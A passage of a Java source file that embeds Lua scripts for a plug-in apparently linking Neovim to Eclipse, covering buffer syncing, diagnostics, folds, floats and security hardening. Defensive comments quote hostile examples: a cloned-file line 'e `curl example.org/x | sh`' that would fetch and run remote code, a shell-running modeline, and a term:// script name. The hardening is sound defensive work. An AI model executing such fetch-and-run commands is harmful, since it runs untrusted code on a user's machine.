     * the next line, byte 2, where Eclipse's caret is; a push would leave it on {@code "beta1"}. And
     * it is safe in the middle of an insert, while keys still arrive: the split is one step between
     * two keys, and its line events come in Neovim's order like theirs.
     *
     * <p>The parts come from Eclipse's document ({@code BufferSynchronizer.splitParts}), which
     * decides where its lines break: {@code "a\r"} before a {@code \n} is one line there when it was
     * loaded so, two when the {@code \r} was typed. A line is split only while it reads as its parts
     * joined by {@code \r}, or with one more {@code \r} at its end (which Eclipse keeps in a
     * {@code \r\n}); a key that changed it since leaves it to the next split. Bottom up, so the line
     * numbers above a split stay right.
     *
     * <p><b>Undo.</b> The split is joined to the buffer's last change ({@code :undojoin}), so it
     * is no undo step of its own. Example: {@code A}, {@code Ctrl-R Ctrl-R a} (the register holds
     * {@code "1\r2"}), {@code Esc}, {@code u}. The split is queued behind the keys, so it usually
     * runs after the {@code Esc}, when the insert's step is closed; as a step of its own, the
     * {@code u} would undo only the split, put back {@code "x1\r2"}, which Eclipse shows as two
     * lines and has split again: {@code u} would never get past it. Joined, one {@code u} undoes
     * the insert with its split. (During the insert Neovim keeps an API change in the insert's step
     * anyway.) Right after an undo there is nothing to join to (E790, silenced): the split is then a
     * step of its own, as the undone text was split before.
     *
     * <p>The buffer is the one of the editor that asked, which need not be the window's any more
     * (the user switched editors before the split ran); its cursor is moved only when the window
     * shows it.
     */
    static final String SPLIT_LINE_BREAKS = """
            local buf, win, splits = tonumber((select(1, ...))), tonumber((select(2, ...))), select(3, ...)
            if not vim.api.nvim_buf_is_valid(buf) then
              return nil
            end
            local cursor = nil
            if win and vim.api.nvim_win_is_valid(win) and vim.api.nvim_win_get_buf(win) == buf then
              cursor = vim.api.nvim_win_get_cursor(win)
            end
            table.sort(splits, function(a, b) return a[1] > b[1] end)
            local count = vim.api.nvim_buf_line_count(buf)
            for _, split in ipairs(splits) do
              local row, parts = split[1], vim.list_extend({}, split[2])
              local line = row <= count and vim.api.nvim_buf_get_lines(buf, row - 1, row, true)[1] or nil
              local joined = table.concat(parts, '\\r')
              if line ~= nil and (line == joined or line == joined .. '\\r') and #parts > 1 then
                if line ~= joined then
                  parts[#parts] = parts[#parts] .. '\\r' -- Eclipse keeps it in a "\\r\\n"
                end
                vim.api.nvim_buf_call(buf, function() -- :undojoin acts on the current buffer
                  vim.cmd('silent! undojoin') -- E790 right after an undo: then a step of its own
                  vim.api.nvim_buf_set_lines(buf, row - 1, row, true, parts)
                end)
                if cursor and cursor[1] > row then
                  cursor[1] = cursor[1] + #parts - 1
                elseif cursor and cursor[1] == row then
                  local col, at = cursor[2], row -- onto the part the cursor was in
                  for k, part in ipairs(parts) do
                    if col <= #part or k == #parts then
                      cursor = { at, col }
                      break
                    end
                    col, at = col - #part - 1, at + 1
                  end
                end
              end
            end
            if cursor then
              pcall(vim.api.nvim_win_set_cursor, win, cursor)
              return vim.api.nvim_win_get_cursor(win)
            end
            return nil
            """;

    /**
     * Module {@code neovim4eclipse.paths}: the one rule for comparing file paths in Neovim, used by
     * every script that compares them ({@link #PROJECT_FILES}, {@link #HOST_COMMANDS},
     * {@link #DOCUMENT_BUFFER}, {@link #LEAVE_FOLDER}) and by the Lua tests ({@code t.same_file}).
     * The code and its comments: {@code core/lua/paths.lua}.
     */
    static final String PATHS = LuaModules.script("paths.lua");

    /**
     * Module {@code neovim4eclipse.project_files}: Neovim never reads a file on disk by itself, a
     * project's or not, since Eclipse opens an editor for either (docs/design/BUFFER_NUMBERS.md,
     * 2.3). The code and its comments: {@code core/lua/project_files.lua}.
     */
    static final String PROJECT_FILES = LuaModules.script("project_files.lua");

    /**
     * Tells {@link #PROJECT_FILES} the open projects' folders (arguments: the folders, one each, as
     * Eclipse gives them: {@code /ws/app}, {@code C:\ws\app}, a linked folder's target), and gives
     * the read hook to the buffers inside them, or takes it from those no longer inside. Sent at the
     * first attach and whenever a project or a linked folder comes or goes.
     */
    static final String SET_PROJECT_FOLDERS = """
            require('neovim4eclipse.project_files').set_folders((...)) -- one list: every folder
            """;

    /**
     * Loads a document's text into its buffer (arguments: the buffer number, and the lines as one
     * list), with {@link #LOAD_WITHOUT_UNDO} (no undo step, marks kept) run in that buffer: for the
     * first load, by number because Neovim may be in a plug-in's float during an attach, whose text
     * it would replace; and again after Neovim loaded it empty by itself, with no text kept from the
     * unload ({@link #DOCUMENT_BUFFER}, "Reloaded by Neovim"). Nothing for a buffer that is gone.
     */
    static final String RELOAD_DOCUMENT_BUFFER = "local function load(...)\n" + LuaScripts.LOAD_WITHOUT_UNDO + """
            end
            local buf = tonumber((select(1, ...)))
            local lines = (select(2, ...))
            if vim.api.nvim_buf_is_valid(buf) then
              vim.api.nvim_buf_call(buf, function() load(lines) end)
            end
            """;

    /**
     * Before a document's buffer is closed (arguments: its number, and the buffer shown instead):
     * closes the editor windows that show it, quietly; the home window shows the other buffer
     * instead (the home buffer if that one was wiped in Neovim). Returns the closed windows' ids and
     * the home buffer's number, as {@link #CLOSE_WINDOW} does, made anew if it was wiped. Example:
     * {@code {{1001, 1002}, 2}}. Unloading a buffer shown in a window would make Neovim close that
     * window or put some other buffer in it, by itself. See {@link #WINDOWS}.
     */
    static final String RELEASE_BUFFER = """
            local buf, fallback = tonumber((select(1, ...))), tonumber((select(2, ...)))
            return require('neovim4eclipse.windows').release(buf, fallback)
            """;

    /**
     * Makes part of a buffer equal to Eclipse's lines, replacing only the lines that differ, between
     * two {@code eclipse_echo} notifications, so that the session drops the change's line events. For
     * the pushes into the attached buffer ({@code NeovimSession.setBufferLines}, {@code
     * setBufferRegion}). Arguments: the buffer's number; the part, as its first line (0-based) and
     * how many lines at the end stay as they are ({@code 0, 0}: the whole buffer); the lines; whether
     * to answer the part's lines as they were. Answers {@code {"changed"}}, {@code {"equal"}} (nothing
     * set), or {@code {"outside"}} when the part is not in the buffer; with the old lines second when
     * asked. Example: {@code (3, 1, 1, {"B"}, false)} on {@code a, b, c} sets line 2 to {@code "B"}
     * and answers {@code {"changed"}}.
     *
     * <h2>Why the echo is marked</h2>
     * The document has those lines already, and an echo applied to it again is not always
     * harmless: one that removes lines removes them a second time. Eclipse's Delete Line in an
     * insert on {@code "alpha"}, then Esc, deleted {@code "beta"} from the document too.
     *
     * <h2>Why read and set in one script</h2>
     * As for {@link #SET_DOCUMENT_LINES}: a change a plug-in makes between a read and a set in two
     * requests would reach the document (it is outside the echo) and be overwritten in Neovim, or
     * the set would meet lines that moved. The cost: the part's lines go to Neovim whole, not only
     * the differing ones. A whole push also gets Neovim's old lines back, as its earlier read did;
     * a part's push (insert mode's few typed lines) gets nothing back.
     */
    static final String SET_LINES_MARKED = """
            local buf, first, keep, lines, want_old = ...
            local count = vim.api.nvim_buf_line_count(buf)
            if first < 0 or keep < 0 or first + keep > count then
              return { 'outside' }
            end
            local current = vim.api.nvim_buf_get_lines(buf, first, count - keep, true)
            local old = want_old and current or nil
            -- The lines that differ: past the common first lines, before the common last ones.
            local from = 1
            while from <= #current and from <= #lines and current[from] == lines[from] do
              from = from + 1
            end
            if from > #current and from > #lines then
              return { 'equal', old }
            end
            local old_end, new_end = #current, #lines
            while old_end >= from and new_end >= from and current[old_end] == lines[new_end] do
              old_end, new_end = old_end - 1, new_end - 1
            end
            local chan = vim.g.neovim4eclipse_channel or 0 -- 0: every channel, Eclipse's among them
            vim.rpcnotify(chan, 'eclipse_echo', buf, true)
            local ok, err = pcall(vim.api.nvim_buf_set_lines, buf, first + from - 1, first + old_end, true,
              vim.list_slice(lines, from, new_end))
            vim.rpcnotify(chan, 'eclipse_echo', buf, false)
            if not ok then
              error(err, 0)
            end
            return { 'changed', old }
            """;

    /**
     * Makes a document's buffer that is not attached equal to the document's lines (arguments: its
     * number, the lines as one list), replacing only the lines that differ, so the marks and undo
     * history of the others stay (a refactoring's change in the background, {@code
     * sync/UnattachedDocumentSync}). Returns {@code "changed"}, {@code "equal"} (nothing was set, so
     * nothing more is to be done) or {@code "gone"} (no such buffer).
     *
     * <h2>Why in one script, between two notifications</h2>
     * The line events of this change are the echo of Eclipse's own text and must not come back to
     * the document; any other change of the buffer must. Neovim runs one script at a time, so
     * nothing else changes the buffer between reading it here and setting it, and it sends the
     * script's notifications and the change's line events on the one channel in the order they
     * happen: {@code eclipse_echo(buf, true)}, the echo, {@code eclipse_echo(buf, false)}. The
     * session drops exactly the line events between the two ({@code NeovimSession.EventSink}).
     * Example: a plug-in's timer edits line 1 just before Eclipse's push of line 2 arrives: its
     * event comes before the first notification and reaches the document; the push's comes inside.
     * (Reading the lines in one request and setting them in a second left a gap where such a change
     * was lost, or met a replacement computed for the lines before it.)
     */
    static final String SET_DOCUMENT_LINES = """
            local buf, lines = tonumber((select(1, ...))), (select(2, ...))
            if not buf or not vim.api.nvim_buf_is_valid(buf) then
              return 'gone'
            end
            if #lines == 0 then
              lines = { '' } -- a buffer always has one line
            end
            local current = vim.api.nvim_buf_get_lines(buf, 0, -1, false)
            -- The lines that differ: past the common first lines, before the common last ones.
            local first = 1
            while first <= #current and first <= #lines and current[first] == lines[first] do
              first = first + 1
            end
            if first > #current and first > #lines then
              return 'equal' -- nothing to set, no echo
            end
            local old_end, new_end = #current, #lines
            while old_end >= first and new_end >= first and current[old_end] == lines[new_end] do
              old_end, new_end = old_end - 1, new_end - 1
            end
            local chan = vim.g.neovim4eclipse_channel or 0 -- 0: every channel, Eclipse's among them
            vim.rpcnotify(chan, 'eclipse_echo', buf, true)
            local ok, err = pcall(vim.api.nvim_buf_set_lines, buf, first - 1, old_end, true,
              vim.list_slice(lines, first, new_end))
            vim.rpcnotify(chan, 'eclipse_echo', buf, false)
            if not ok then
              error(err, 0)
            end
            return 'changed'
            """;

    /**
     * Sets {@code 'modified'} of a buffer (arguments: its number, {@code "1"} or {@code "0"}) to
     * Eclipse's dirty flag: Eclipse decides whether a document has unsaved changes, and Neovim's flag
     * follows, so that {@code :update} and {@code :bufdo update} write what Eclipse would save and
     * {@code :ls} shows {@code +} for it. Example: Ctrl+S in Eclipse clears it; typing in Eclipse,
     * or a change made by Neovim, sets it.
     */
    static final String SET_MODIFIED = """
            local bufnr, modified = ...
            local buf = tonumber(bufnr) -- not tonumber(select(1, ...)): the second argument would be a base
            if vim.api.nvim_buf_is_valid(buf) then
              vim.bo[buf].modified = modified == '1'
            end
            """;

    /**
     * Replaces the Eclipse problems of one buffer with a new list, as Neovim diagnostics in the
     * namespace {@code neovim4eclipse} ({@code :help vim.diagnostic.set()}). Argument: one list, of
     * the buffer number, then six per problem (one list: a big workspace has thousands, see
     * {@code NeovimApi.execLua}): lnum, col, end_lnum, end_col (0-based lines, byte columns),
     * severity (1 error, 2 warning, 3 info), message ({@code util/Diagnostic.toLuaArgs}). With the
     * number alone, the buffer's problems are cleared. A buffer that is gone (its editor closed
     * meanwhile) is left alone.
     *
     * <p>Each call replaces the whole list, so nothing is diffed. Neovim then moves the diagnostics
     * with the text as it is edited (extmarks) until Eclipse sends the next list. Example: arguments
     * {@code { 3, 0, 4, 0, 7, 1, "x cannot be resolved" }} put one error on line 1 of buffer 3, and
     * {@code ]d} from the start of the buffer goes there.
     */
    static final String SET_DIAGNOSTICS = """
            local args = ...
            local buf = tonumber(args[1])
            if not buf or not vim.api.nvim_buf_is_valid(buf) then
              return
            end
            local list = {}
            for i = 2, #args - 5, 6 do
              list[#list + 1] = {
                lnum = tonumber(args[i]),
                col = tonumber(args[i + 1]),
                end_lnum = tonumber(args[i + 2]),
                end_col = tonumber(args[i + 3]),
                severity = tonumber(args[i + 4]),
                message = args[i + 5],
                source = 'Eclipse',
              }
            end
            vim.diagnostic.set(vim.api.nvim_create_namespace('neovim4eclipse'), buf, list)
            """;

    /**
     * Returns whether Eclipse's problems are sent to Neovim: {@code true} unless the user's config
     * says {@code vim.g.neovim4eclipse_problems = 0} (or {@code false}). The session runs it once at
     * start, after {@link #SETUP} (so after {@code init.lua}), and keeps the answer
     * ({@code NeovimSession.problemsEnabled()}): when off, no {@link #SET_DIAGNOSTICS} is ever sent.
     * Changing the variable later needs a Neovim restart.
     *
     * <p><b>Off, only the message changes.</b> With no diagnostics, Neovim's {@code ]d} says "No more
     * valid diagnostics to move to", the same words as in a file without problems, so the user cannot
     * tell that the plug-in sends none. This script then wraps Neovim's default {@code ]d [d ]D [D}
     * in a function that, in a buffer with no diagnostics at all, says why instead:
     * {@code ]d: Eclipse's problems are not sent to Neovim (vim.g.neovim4eclipse_problems = 0)}. In
     * every other case it calls Neovim's own mapping, unchanged: the jump, the count, the jump list,
     * the {@code on_jump} hook and diagnostics of the user's own (nvim-lint, a language server in
     * {@code init.lua}) all stay Neovim's. The wrapper only adds words; it does not redo anything
     * Neovim does (the project's rule: let Neovim do the work).
     *
     * <p>Only Neovim's default mappings are wrapped. One is recognized by two things: its description
     * is Neovim's ({@code "Jump to the next diagnostic in the current buffer"} for {@code ]d}), and its
     * function comes from Neovim's own runtime: defined in {@code vim/_core/defaults}, or with no
     * source at all ({@code "?"}). The Windows build of Neovim 0.12.6 compiles its runtime without
     * debug information, so there {@code debug.getinfo} gives {@code "?"}, where Linux and macOS give
     * {@code "@vim/_core/defaults"}; a function from a user's {@code init.lua} always names its file.
     * A key the user mapped or unmapped in {@code init.lua} is left as it is, even one that copies
     * Neovim's description. Should a later Neovim change the descriptions, nothing is wrapped and
     * Neovim's own message appears: harmless.
     */
    static final String PROBLEMS = """
            local enabled = vim.g.neovim4eclipse_problems
            if enabled ~= 0 and enabled ~= false then
              return true
            end
            local defaults = { -- Neovim's descriptions of its own mappings (runtime/lua/vim/_core/defaults.lua)
              [']d'] = 'Jump to the next diagnostic in the current buffer',
              ['[d'] = 'Jump to the previous diagnostic in the current buffer',
              [']D'] = 'Jump to the last diagnostic in the current buffer',
              ['[D'] = 'Jump to the first diagnostic in the current buffer',
            }
            for _, lhs in ipairs({ ']d', '[d', ']D', '[D' }) do
              local default = vim.fn.maparg(lhs, 'n', false, true)
              local source = type(default.callback) == 'function'
                and debug.getinfo(default.callback, 'S').source or ''
              -- '?': the Windows build has no debug information for its runtime (see above)
              local neovims = source:find('vim/_core/defaults', 1, true) or source == '?'
              if neovims and default.desc == defaults[lhs] then
                vim.keymap.set('n', lhs, function()
                  if #vim.diagnostic.get(0) == 0 then
                    vim.api.nvim_echo({ { lhs .. ": Eclipse's problems are not sent to Neovim"
                      .. ' (vim.g.neovim4eclipse_problems = 0)', 'WarningMsg' } }, true, {})
                  else
                    default.callback() -- Neovim's own: it reads v:count1 of this same key press
                  end
                end, { desc = default.desc .. " (Eclipse's problems are off)" })
              end
            end
            return false
            """;

    /**
     * Maps the keys only the IDE can carry out ({@code gd}, {@code K}, the {@code gr*} keys,
     * {@code gt}; see {@link IdeAction}): each sends {@code eclipse_action} with its action and
     * Vim's count ({@code v:count}, the count typed before the key). The code and its comments:
     * {@code core/lua/ide_keys.lua}.
     */
    static final String IDE_KEYS = LuaModules.script("ide_keys.lua");

    /**
     * Module {@code neovim4eclipse.quickfix}: the quickfix lists of the workspace's problems and
     * tasks (docs/design/DIAGNOSTICS.md, section 5). The code and its comments:
     * {@code core/lua/quickfix.lua}.
     */
    static final String QUICKFIX = LuaModules.script("quickfix.lua");

    /**
     * Fills or updates a quickfix list of Eclipse's (argument: {@code util/QuickfixEntries.toLuaArgs}
     * as one list, since {@code :Eproblems} may have thousands of entries; see
     * {@code NeovimApi.execLua}); see {@link #QUICKFIX}.
     */
    static final String SET_QUICKFIX = """
            local a = ...
            require('neovim4eclipse.quickfix').set(a[1], a[2], a[3], a[4], vim.list_slice(a, 5))
            """;

    /**
     * The current quickfix list's kind and argument ({@code {"problems", "warning"}}) when it is one
     * of Eclipse's, else {@code nil}; see {@link #QUICKFIX}.
     */
    static final String QUICKFIX_CURRENT = "return require('neovim4eclipse.quickfix').current()";

    /**
     * Installs the fold module, {@code require('neovim4eclipse.folds')}, unless the user's config
     * turned folding off with {@code vim.g.neovim4eclipse_folds = 0} (or {@code false}), and
     * returns whether folding is on. The code and its comments: {@code core/lua/folds.lua}.
     */
    static final String FOLDS = LuaModules.script("folds.lua");

    /**
     * Replaces the folds of the window showing a buffer with Eclipse's (argument: one list, of the
     * buffer number, then first line, last line, {@code "1"} if collapsed, per fold, from
     * {@code util/FoldRegions.toLuaArgs}). Done only when that buffer is in the editor's window ({@link #WINDOWS}' {@code editor_window}: the current one, or the one under a plug-in's float Neovim is in): folds
     * belong to a window, and another buffer gets its folds when Eclipse shows it. With the number
     * alone the editor cannot fold, and folding is turned off in the window. How: {@link #FOLDS}'
     * {@code set}. Sent only when folding is on, so the module is always there.
     *
     * <p>Example: {@code { 3, 1, 20, 0, 10, 15, 1 }} gives buffer 3 an open fold over lines 1-20 with a
     * closed one over lines 10-15 inside it; {@code zj} from line 1 then goes to line 10.
     */
    static final String SET_FOLDS = """
            local args = ...
            local buf = tonumber(args[1])
            local folds = package.loaded['neovim4eclipse.folds']
            local windows = package.loaded['neovim4eclipse.windows']
            local win = windows and windows.editor_window() or vim.api.nvim_get_current_win()
            if not folds or not buf or vim.api.nvim_win_get_buf(win) ~= buf then
              return
            end
            local list = {}
            for i = 2, #args - 2, 3 do
              list[#list + 1] = { tonumber(args[i]), tonumber(args[i + 1]), args[i + 2] == '1' }
            end
            vim.api.nvim_win_call(win, function() folds.set(buf, list) end)
            """;

    /**
     * Installs the viewport module, {@code require('neovim4eclipse.viewport')}. The code and its
     * comments: {@code core/lua/viewport.lua}.
     */
    static final String VIEWPORT = LuaModules.script("viewport.lua");

    /**
     * Search highlighting (docs/design/SEARCH_HIGHLIGHTING.md): the matches of Neovim's search that
     * the current window shows, sent to Eclipse, which paints them behind the editor's text. The
     * code and its comments: {@code core/lua/search.lua}.
     */
    static final String SEARCH = LuaModules.script("search.lua");

    /**
     * Neovim's own highlights that the editor shows besides search matches
     * (docs/design/SEARCH_HIGHLIGHTING.md, "The yank flash and window matches"): the flash after a
     * yank, and the window's matches. The code and its comments: {@code core/lua/highlights.lua}.
     */
    static final String HIGHLIGHTS = LuaModules.script("highlights.lua");

    /**
     * The rows and columns Neovim's screen has besides the text of the editor's window ({@link #WINDOWS}' {@code editor_window}: the current one, or the one under a plug-in's float Neovim is in),
     * {@code { rows, columns }}; see {@link #VIEWPORT}'s {@code overhead}.
     */
    static final String VIEWPORT_OVERHEAD = """
            local windows = package.loaded['neovim4eclipse.windows']
            local win = windows and windows.editor_window() or vim.api.nvim_get_current_win()
            return vim.api.nvim_win_call(win, require('neovim4eclipse.viewport').overhead)
            """;

    /**
     * A message of the plug-in's own, shown as Neovim shows its own: {@code (message, error)};
     * ui2 draws it, {@code :messages} keeps it, an error is in {@code ErrorMsg}. Example:
     * {@code ("E37: No write since last change (add ! to override)", true)}.
     */
    static final String ECHO = """
            local message, err = ...
            vim.api.nvim_echo({ { message } }, true, { err = err })
            """;

    /**
     * Sets Neovim's {@code 'background'} to the argument, {@code "dark"} or {@code "light"}, unless
     * it is that already: from Eclipse's theme, so a colorscheme with both variants picks the one
     * that matches the editor, whose colors the command-line window takes for its default ones
     * ({@code editor/GridCanvas}). Overrides a {@code 'background'} the user's config set.
     */
    static final String SET_BACKGROUND = """
            local background = ...
            if vim.o.background ~= background then
              vim.o.background = background
            end
            """;


    /**
     * Leaves the plug-in's float Neovim's cursor is in, closing it, and the float named by the
     * argument too (-1: none) ({@link #WINDOWS}' {@code leave_float}): the user turned Neovim mode
     * off. For clicking away, {@link #MOVE_OUT_OF_FLOAT}. Answers whether one was closed.
     */
    static final String LEAVE_FLOAT = """
            return package.loaded['neovim4eclipse.windows'].leave_float(tonumber((...)))
            """;

    /**
     * Ends an insert begun in the plug-in's float Neovim is in, while it is still there, when the
     * script sent next will leave that float ({@link #WINDOWS}' {@code end_float_insert}): the first
     * of the two steps of every route that takes Neovim out of a float
     * ({@code DocumentBuffers.leavingFloat}). Arguments: the route ({@link #FLOAT_EXITS}), then the
     * next script's own arguments. Example: {@code ("close", "1002", "3")} before
     * {@code CLOSE_WINDOW} of window 1002 ends the insert only if Neovim's float is in 1002's tab
     * page. Answers whether {@code :stopinsert} ran.
     */
    static final String END_FLOAT_INSERT = """
            local windows = package.loaded['neovim4eclipse.windows']
            if windows == nil then
              return false
            end
            local args = { ... }
            for i = 2, #args do
              args[i] = tonumber(args[i]) or args[i] -- window and buffer numbers; past_limits stays words
            end
            return windows.end_float_insert(unpack(args))
            """;

    /**
     * Moves Neovim out of the plug-in's float it is in, to the editor's window, the float staying
     * open ({@link #WINDOWS}' {@code move_out_of_float}): the user clicked the text or left for
     * another part. The argument names the float the cursor was in when the keyboard left, or is
     * -1. Answers whether Neovim moved.
     */
    static final String MOVE_OUT_OF_FLOAT = """
            return package.loaded['neovim4eclipse.windows'].move_out_of_float(tonumber((...)))
            """;

    /**
     * For a press in the text that stays Eclipse's (a right click, Ctrl+click): moves Neovim out of
     * the plug-in's float it is in, and abandons a {@code :} line opened from it. Decided here,
     * since the cursor is on Neovim's command line then and only Neovim knows a float is behind it.
     * In no float, nothing: a line opened from the editor stays. Whether Neovim moved.
     */
    static final String LEAVE_FLOAT_WITH_LINE = """
            local windows = package.loaded['neovim4eclipse.windows']
            if not windows.focused_float(0) then
              return false
            end
            if vim.api.nvim_get_mode().mode:sub(1, 1) == 'c' then
              vim.api.nvim_input('<C-c>')
            end
            return windows.move_out_of_float(-1)
            """;

    /**
     * Closes the plug-in's float Neovim is in when the editor does not draw it, with a message
     * ({@link #WINDOWS}' {@code close_undrawn}, the one place that decides it, from what Neovim
     * says there): sent from the redraw flush that finds Neovim's cursor on a grid the editor does
     * not draw ({@code util/Grids.unseenCursor}). First argument: the window the session saw on
     * that grid, or -1 (a hidden float's is forgotten); second: the limits it would be past
     * ({@code util/Grids.PAST_LIMITS}, their one source), named when that window is the one.
     */
    static final String CLOSE_UNDRAWN_FLOAT = """
            local win, past_limits = ...
            return package.loaded['neovim4eclipse.windows'].close_undrawn(tonumber(win), past_limits)
            """;

    /**
     * The route of each script that can take Neovim out of a float, as {@link #WINDOWS}' table
     * {@code leaves} names it: {@link #END_FLOAT_INSERT} is sent with it and the script's own
     * arguments, and ends a float's insert only when that script will leave the float. The one list
     * of those scripts: {@code DocumentBuffers.leavingFloat} refuses a script not in it.
     * {@code LuaScriptsTest} checks that each route is a key of {@code leaves}.
     */
    static final Map<String, String> FLOAT_EXITS = Map.of(
            FOCUS_WINDOW, "focus",
            SHOW_WINDOW, "show",
            CLOSE_WINDOW, "close",
            RELEASE_BUFFER, "release",
            LEAVE_FLOAT, "move",
            MOVE_OUT_OF_FLOAT, "move",
            LEAVE_FLOAT_WITH_LINE, "move",
            CLOSE_UNDRAWN_FLOAT, "undrawn");

    /**
     * Turns on Neovim's ui2, which draws the command line, its prompts, the pager and messages
     * itself, in four floating windows, so that the editor only copies their cells as it does any
     * float's (docs/ARCHITECTURE.md, "The command line and messages"). The code and its comments:
     * {@code core/lua/ui2.lua}.
     */
    static final String UI2 = LuaModules.script("ui2.lua");

    /**
     * Turns {@code 'modeline'} off, for the buffers there are and those to come: run once at
     * start, after the user's config.
     *
     * <p><b>Why.</b> A modeline is a line of a file that sets options when Neovim reads the file
     * ({@code // vim: set ts=4 :}), and the files are a cloned repository's. Most options a
     * modeline may set are harmless, but some are global and change what a later key does.
     * Example: {@code vim: set isfname+=`,32 :} adds the backtick and the space to the
     * characters of a file name; from then on {@code Ctrl-X Ctrl-F}, in any buffer, takes a
     * line's {@code `...`} for a file name, and completing a file name runs that in the shell.
     *
     * <p><b>Why for all buffers.</b> Neovim reads file text on many routes: the plug-in's own
     * reads ({@link #PROJECT_FILES}, {@link #CREATE_DOCUMENT_BUFFER}), but also the first match of
     * {@code :vimgrep}, an archive's listing and its members ({@code zip.vim}, {@code tar.vim}),
     * a help page, {@code gf} on a URL. Turned off per route, each new route would be a hole;
     * the option itself is the one place all of them end in.
     *
     * <p>What it costs: no file's modeline applies, a help page's among them (its tab width and
     * text width are then Neovim's defaults). A user who wants modelines can {@code :set
     * modeline} later; the plug-in's own reads stay without.
     */
    static final String NO_MODELINES = """
            vim.go.modeline = false
            for _, buf in ipairs(vim.api.nvim_list_bufs()) do
              pcall(function()
                vim.bo[buf].modeline = false
              end)
            end
            return true
            """;

    /**
     * Stops Neovim from starting a program for a buffer named {@code term://...}: run once at
     * start, always.
     *
     * <p><b>Why.</b> Neovim's defaults read a buffer of that name by running what follows the
     * scheme in a terminal (the {@code BufReadCmd} of the group {@code nvim.terminal}). The
     * name can come from a file's text. Example: a cloned file holds {@code term://./build.sh};
     * {@code gf} on it would run the repository's script. It is no bundled plug-in with an
     * "already loaded" variable ({@code NvimExecutable.READERS_OFF}), so the autocommand itself
     * is removed.
     *
     * <p>What it costs: {@code :edit term://cmd} opens an empty buffer. {@code :terminal cmd}
     * does not use this autocommand; a typed one does not reach Neovim at all ({@link #TERMINALS}).
     */
    static final String NO_TERMINAL_URLS = """
            pcall(vim.api.nvim_clear_autocmds, { group = 'nvim.terminal', event = 'BufReadCmd' })
            return true
            """;

    /**
     * Says so when a Neovim terminal starts that Eclipse cannot show: run once at start, always.
     *
     * <p><b>Why.</b> Eclipse has no view for a terminal buffer: the editor goes back to its file, as
     * after any buffer it cannot show, and the terminal's program runs on out of sight until it exits
     * or Neovim stops. A typed {@code :terminal} never gets here: {@link #HOST_COMMANDS} hands it to
     * Eclipse before Neovim runs it ({@code HostCommand.Kind.TERMINAL}), which opens its own
     * Terminal view. What does get here is a terminal started where the {@code :} line is not
     * looked at: a {@code <Cmd>terminal<CR>} mapping, {@code :execute}, Lua
     * ({@code vim.cmd.terminal()}), a plug-in's {@code jobstart({term = true})} (toggleterm,
     * lazygit.nvim). By {@code TermOpen} its program has already started, so it is not stopped: a
     * stop could leave its work half done ({@code make} part way). It runs on, and the message names
     * it, so nothing runs unseen without a word.
     *
     * <p>Example: a mapping {@code <Cmd>terminal lazygit<CR>} shows
     * {@code terminal: "lazygit" is running hidden: Eclipse cannot show a Neovim terminal. It stops
     * when it exits or Neovim does.} The program is read from the buffer's name, which Neovim gives
     * every terminal as {@code term://<folder>//<pid>:<command>}: the command line for a string
     * ({@code :terminal lazygit}, {@code jobstart('make', {term = true})}), only the program (its
     * full path) for a list ({@code jobstart({'sh', '-c', 'make'}, {term = true})} names
     * {@code /usr/bin/sh}). A terminal that runs no program ({@code nvim_open_term}, which some
     * plug-ins use to show coloured text) gets no message: its channel is no job.
     *
     * <p>Shown with {@code nvim_echo}, which changes no mode (this may run in insert mode; a plain
     * {@code :normal} would fire {@code ModeChanged}).
     */
    static final String TERMINALS = """
            vim.api.nvim_create_autocmd('TermOpen', {
              group = vim.api.nvim_create_augroup('neovim4eclipse_terminals', { clear = true }),
              desc = 'Say that Eclipse cannot show this terminal',
              callback = function(a)
                if not pcall(vim.fn.jobpid, vim.bo[a.buf].channel) then
                  return -- nvim_open_term: no program runs
                end
                local command = vim.api.nvim_buf_get_name(a.buf):match('^term://.-//%d+:(.*)$')
                local what = command and ('"' .. command .. '"') or 'a terminal'
                vim.api.nvim_echo({ { 'terminal: ' .. what .. ' is running hidden: Eclipse cannot show a Neovim terminal.'
                  .. ' It stops when it exits or Neovim does.' } }, true, {})
              end,
            })
            return true
            """;

    /**
     * Refuses three of insert mode's {@code Ctrl-X} completions, whoever sends the keys: run once
     * at start, always (it does not depend on the completion list being drawn).
     *
     * <p><b>Why.</b> {@code Ctrl-X Ctrl-V} (and {@code Ctrl-X Ctrl-Q}, the same key by its other
     * name) completes the text before the cursor as a Vim command line, and command-line
     * completion expands a file name in backticks by running it in the shell
     * ({@code :help backtick-expansion}). The text before the cursor is the file's. Example: a
     * cloned file holds the line {@code e `curl example.org/x | sh`}; with the cursor at its end,
     * {@code Ctrl-X Ctrl-V} would run that. {@code Ctrl-X Ctrl-O} calls {@code 'omnifunc'}, which
     * for some file types evaluates the buffer's code; the plug-in's editor buffers have none
     * set, but a buffer Neovim read itself can, and Eclipse's content assist is what completes
     * code here ({@code KeyRouter} runs it for the key in an insert Eclipse types).
     *
     * <p><b>How.</b> {@code vim.on_key} sees every key Neovim is about to handle, typed, sent by
     * the plug-in, from a mapping or from a register run as a macro, and returning {@code ''}
     * drops it. Whether {@code Ctrl-X} was just pressed is Neovim's own answer:
     * {@code complete_info()} says mode {@code ctrl_x} then, in a fresh insert as after
     * {@code Ctrl-N} ({@code :help complete_info()}). A refused key arriving in that state is dropped, and a {@code Ctrl-Z} is put
     * in its place at the head of the typeahead, not remapped: {@code Ctrl-X Ctrl-Z} ends the
     * completion and changes no text. One place, behind every route to it, so no route needs a
     * check of its own.
     *
     * <p><b>The key with a modifier too.</b> A UI may send {@code Ctrl-V} with Shift or another
     * modifier ({@code <C-S-v>}); Neovim then gets the same last byte behind a modifier prefix
     * ({@code 0x80 0xfc}, the modifier's bits), and completes all the same. So the last byte
     * decides.
     *
     * <p><b>Not in the command-line window of {@code :} commands</b> ({@code q:}): there the text
     * is the user's own command lines, as in the {@code :} line, and Neovim maps {@code Tab} to
     * {@code Ctrl-X Ctrl-V} to complete them. In the window of searches ({@code q/}) it is
     * refused: a search pattern is no command, and it may be text taken from a file.
     *
     * <p>What it costs: Vim's command-line completion and omni completion are not available in
     * insert mode outside the command-line window, also for a user who set an {@code 'omnifunc'}
     * on purpose.
     */
    static final String CTRL_X_GUARD = """
            local REFUSED = {
              ['\\22'] = 'Ctrl-X Ctrl-V (command-line completion) is not available here: it can run commands found in the text',
              ['\\17'] = 'Ctrl-X Ctrl-Q (command-line completion) is not available here: it can run commands found in the text',
              ['\\15'] = "Ctrl-X Ctrl-O (omni completion) is not available here: use Eclipse's content assist",
            }
            local CTRL_Z = '\\26'
            local ns = vim.api.nvim_create_namespace('neovim4eclipse_ctrl_x_guard')
